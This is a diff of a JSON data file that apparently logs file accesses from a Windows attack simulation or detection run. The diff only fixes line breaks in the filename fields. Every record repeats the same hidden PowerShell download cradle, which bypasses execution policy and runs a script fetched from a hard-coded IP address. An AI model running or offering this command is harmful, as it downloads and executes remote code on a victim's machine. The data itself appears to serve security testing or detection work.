@@ -1,570 +1,570 @@
 [
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPrivate/Replace-InputArgs.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Private/Replace-InputArgs.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "006401820d5bb1cea1b55b8036e0dfc8"
     },
     {
-        "filename": "  C:/Users/Administrator/Documents/\\\nWindowsPowerShell/Modules/powershell-yaml/0.4.2/Load-Assemblies.ps1\"",
+        "filename": "  C:/Users/Administrator/Documents/WindowsPowerShell/Modules/powershell-yaml/0.4.2/Load-Assemblies.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "03560afb9c8daeb603ee6c55bbb4695c"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/System.Transactions/fc9fa8e7199a9de7e5fec8451c225e74/System.Transactions.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/System.Transactions/fc9fa8e7199a9de7e5fec8451c225e74/System.Transactions.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "082f4eefef02117ecf4b516ba91580c3"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/Microsoft.P6f792626#/28db0adeaa1673ad2153838c4fab846f/Microsoft.PowerShell.Security.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/Microsoft.P6f792626#/28db0adeaa1673ad2153838c4fab846f/Microsoft.PowerShell.Security.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "09ca9a84830d6ddc295cd6dfcfbda2d7"
     },
     {
-        "filename": "  C:/WINDOWS/System32/WindowsPowerShell/\\\nv1.0/powershell.exe.config\"",
+        "filename": "  C:/WINDOWS/System32/WindowsPowerShell/v1.0/powershell.exe.config\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "0e19b6c9eca7e737d28bbbd7fffe4d88"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPrivate/Write-PrereqResults.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Private/Write-PrereqResults.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "0f823d6298effd87402c20641a7baf43"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/Microsoft.Pb378ec07#/7938349935c1cc06e3f984c1ac041b32/Microsoft.PowerShell.ConsoleHost.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/Microsoft.Pb378ec07#/7938349935c1cc06e3f984c1ac041b32/Microsoft.PowerShell.ConsoleHost.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "107a211d8764e418ea726b93002fe5e8"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/System.Management/4e55bef4961ed9d49e373b949b492ac6/System.Management.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/System.Management/4e55bef4961ed9d49e373b949b492ac6/System.Management.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "11cde7a22b9845e144b5152cca18cd1b"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nInvoke-AtomicRedTeam.psm1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Invoke-AtomicRedTeam.psm1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "12fa9a204a5ee1232cb57b1f0e8960fb"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_xbawa0xe.cb2.ps1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_xbawa0xe.cb2.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "16ae7add853dceeebcc665db6c3bcbbd"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/yajshw1q/yajshw1q.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/yajshw1q/yajshw1q.dll\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "2064eb64d5e7b6903209579549403a74"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/Microsoft.P521220ea#/1b4209e86bd3156d405444899ee91123/Microsoft.PowerShell.Commands.Utility.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/Microsoft.P521220ea#/1b4209e86bd3156d405444899ee91123/Microsoft.PowerShell.Commands.Utility.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "260bfda9811d2558bd7c2000d66c6c6a"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPrivate/Get-TargetInfo.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Private/Get-TargetInfo.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "2732a785b81fe08afbfd36e521924a7f"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/System.Core/5c31c6316fee5ea792b0b7151c3ef775/System.Core.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/System.Core/5c31c6316fee5ea792b0b7151c3ef775/System.Core.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "2874eca7357e45c5724127b597a1991c"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/ModuleAnalysisCache\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/ModuleAnalysisCache\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "307978dad27960e71f6ee1518655f3d9"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPrivate/Invoke-CheckPrereqs.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Private/Invoke-CheckPrereqs.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "309f4fcdb2e411ce2d30be3470551330"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/System.Numerics/92568befc418011446e548ce95a1dfa3/System.Numerics.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/System.Numerics/92568befc418011446e548ce95a1dfa3/System.Numerics.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "32502016d42805fbdb27df1222934c1a"
     },
     {
-        "filename": "  C:/Users/Administrator/Documents/\\\nWindowsPowerShell/Modules/powershell-yaml/0.4.2/powershell-yaml.psm1\"",
+        "filename": "  C:/Users/Administrator/Documents/WindowsPowerShell/Modules/powershell-yaml/0.4.2/powershell-yaml.psm1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "3c6c1930f29b634a4e82ee88e568f39e"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPublic/Get-AtomicTechnique.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Public/Get-AtomicTechnique.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "3e4fad46348394a8b02c986bc553a3c8"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/Microsoft.Mf49f6405#/b0d11d035ddae728194023e89a1a1c5b/Microsoft.Management.Infrastructure.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/Microsoft.Mf49f6405#/b0d11d035ddae728194023e89a1a1c5b/Microsoft.Management.Infrastructure.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "4437e2226cd96eaa2dc245648f697d47"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/System/4fae0c463781aeca4f295633db4577d5/System.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/System/4fae0c463781aeca4f295633db4577d5/System.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "471748d2140ef6c568c06f65e2f048d7"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/System.Dired13b18a9#/c7e770e3c054f4f27b9cc33f163b310f/System.DirectoryServices.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/System.Dired13b18a9#/c7e770e3c054f4f27b9cc33f163b310f/System.DirectoryServices.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "47e107ab6f202c9be153587b1812a537"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPublic/Start-AtomicGUI.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Public/Start-AtomicGUI.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "490d3b80d8d8746bef43239c3de00a26"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/mscorlib/c5986fd5d6139abd4222b5cb6a32cadf/mscorlib.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/mscorlib/c5986fd5d6139abd4222b5cb6a32cadf/mscorlib.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "5629aa5e70d61a3fe3ea51d9c3878001"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/System.Xml/9bf3cbd1a18fb58adbcbd9f6b95aa571/System.Xml.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/System.Xml/9bf3cbd1a18fb58adbcbd9f6b95aa571/System.Xml.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "581eb2571619553b8b7782eaa203cbd5"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPublic/New-Atomic.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Public/New-Atomic.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "587f6f4cd494795b875aacb29d4f356b"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/StartupProfileData-NonInteractive\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/StartupProfileData-NonInteractive\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "6e78f140df2bc3c09194c2c76756d66b"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/yajshw1q/yajshw1q.out\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/yajshw1q/yajshw1q.out\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "6fc63870bc4421177539f72634301d97"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/yajshw1q/yajshw1q.0.cs\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/yajshw1q/yajshw1q.0.cs\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "7d58a6488d3955d633ca4af9a7fee661"
     },
     {
-        "filename": "  C:/WINDOWS/System32/WindowsPowerShell/\\\nv1.0/powershell.exe.Config\"",
+        "filename": "  C:/WINDOWS/System32/WindowsPowerShell/v1.0/powershell.exe.Config\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "8086da4d29cb0d5b833e56dc000b1db0"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/yajshw1q/yajshw1q.cmdline\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/yajshw1q/yajshw1q.cmdline\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "82f38fb8e86c7a63e0377769a63372fb"
     },
     {
-        "filename": "  C:/WINDOWS/system32/WindowsPowerShell/\\\nv1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psd1\"",
+        "filename": "  C:/WINDOWS/system32/WindowsPowerShell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psd1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "88ac9f7194c2d207faeca72ce75c97b1"
     },
     {
-        "filename": "  C:/Users/Administrator/Documents/\\\nWindowsPowerShell/Modules/powershell-yaml/0.4.2/powershell-yaml.psd1\"",
+        "filename": "  C:/Users/Administrator/Documents/WindowsPowerShell/Modules/powershell-yaml/0.4.2/powershell-yaml.psd1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "9496841b4a499adca4d011dee04e3d33"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPrivate/Show-Details.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Private/Show-Details.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "99b1ccdda3c2c78d774a3109ecd615ac"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPrivate/Get-PrereqExecutor.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Private/Get-PrereqExecutor.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "9bd4379582e979017296c6758f07f9ec"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPublic/Invoke-AtomicTest.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Public/Invoke-AtomicTest.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "a209feff7eb6e75311e8e1c9772451d7"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nInvoke-AtomicRedTeam.psd1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "a2e6e74dfa1f9f2707b4dc972826c973"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/System.Data/09a6544726bc327e8785c6fbfc852e02/System.Data.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/System.Data/09a6544726bc327e8785c6fbfc852e02/System.Data.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "a6a1a954e0a8a4856301427ae97a5e6f"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPrivate/AtomicClassSchema.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Private/AtomicClassSchema.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "b097e6416813ce806b53e91fd62e4f7a"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPublic/Invoke-WebRequestVerifyHash.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Public/Invoke-WebRequestVerifyHash.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "b2a9b1a891f1697df94fe602d629bb3c"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPrivate/Invoke-Process.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Private/Invoke-Process.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "b3967df48961299e5b7c35d321c0bbcf"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/System.Configuration/420e4a1b1547ed2e84bae31d787dd49a/System.Configuration.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/System.Configuration/420e4a1b1547ed2e84bae31d787dd49a/System.Configuration.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "b47011c3cd237f7496d81c3d20b19c36"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPrivate/Invoke-KillProcessTree.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Private/Invoke-KillProcessTree.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "b8013d2e044ccbdd387313cf796a4468"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/System.Manaa57fc8cc#/74082c591945de777222b489b905782b/System.Management.Automation.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/System.Manaa57fc8cc#/74082c591945de777222b489b905782b/System.Management.Automation.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "b8e7990baec7a436b728a2ebf2a11278"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPrivate/Write-KeyValue.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Private/Write-KeyValue.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "ba1b4d6553e43c9fce0d87c4bc692a93"
     },
     {
-        "filename": "  C:/Users/Administrator/Documents/\\\nWindowsPowerShell/Modules/powershell-yaml/0.4.2/PSGetModuleInfo.xml\"",
+        "filename": "  C:/Users/Administrator/Documents/WindowsPowerShell/Modules/powershell-yaml/0.4.2/PSGetModuleInfo.xml\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "c2da9b3684359cc2843a945db6d487ac"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPrivate/Invoke-ExecuteCommand.ps1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Private/Invoke-ExecuteCommand.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "c962d71574631b235dafa0bec8d64a08"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_jyazbxxx.geh.psm1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_jyazbxxx.geh.psm1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "cb62f8412fdcbf7382158deff488ba53"
     },
     {
-        "filename": "  C:/Users/Administrator/Documents/\\\nWindowsPowerShell/Microsoft.PowerShell_profile.ps1\"",
+        "filename": "  C:/Users/Administrator/Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "cc05a89aa48a82595d063179332c9009"
     },
     {
-        "filename": "  C:/WINDOWS/system32/WindowsPowerShell/\\\nv1.0/Modules/Microsoft.PowerShell.Management/Microsoft.PowerShell.Management.psd1\"",
+        "filename": "  C:/WINDOWS/system32/WindowsPowerShell/v1.0/Modules/Microsoft.PowerShell.Management/Microsoft.PowerShell.Management.psd1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "da407905e158ac4b76834072db9b16f1"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/System.Confe64a9051#/98b007f6a3bbd675b843d917cd189e23/System.Configuration.Install.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/System.Confe64a9051#/98b007f6a3bbd675b843d917cd189e23/System.Configuration.Install.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "e165c3742a8de965063eb80b7f1ccbe2"
     },
     {
-        "filename": "  C:/WINDOWS/system32/WindowsPowerShell/\\\nv1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psm1\"",
